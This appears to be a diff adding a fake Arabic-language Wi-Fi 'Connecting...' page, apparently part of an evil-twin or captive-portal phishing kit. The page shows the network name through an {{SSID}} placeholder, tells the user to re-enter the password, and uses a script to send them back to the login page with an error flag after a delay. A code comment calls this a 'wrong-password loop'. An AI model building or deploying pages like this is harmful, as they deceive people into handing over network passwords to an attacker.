@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connecting...</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+    body {
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      background: linear-gradient(145deg, #0f172a, #1e293b); color: #e2e8f0;
+    }
+    .box {
+      background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 18px; padding: 36px 28px; width: min(92vw, 380px); text-align: center;
+      backdrop-filter: blur(10px);
+    }
+    .spinner {
+      width: 48px; height: 48px; margin: 0 auto 18px;
+      border: 3px solid rgba(255,255,255,0.15); border-top-color: #38bdf8;
+      border-radius: 50%; animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h1 { font-size: 1.25rem; margin-bottom: 8px; }
+    p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; }
+    .ssid { color: #7dd3fc; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+    <h1>جاري الاتصال...</h1>
+    <p>يتم التحقق من الوصول إلى شبكة <span class="ssid">{{SSID}}</span></p>
+    <p style="margin-top:12px">إذا استمرت المشكلة أعد إدخال كلمة المرور.</p>
+  </div>
+  <script>
+    // After delay, send user back to login (wrong-password loop style)
+    setTimeout(function () {
+      location.href = '/?error=1';
+    }, 3500);
+  </script>
+</body>
+</html>
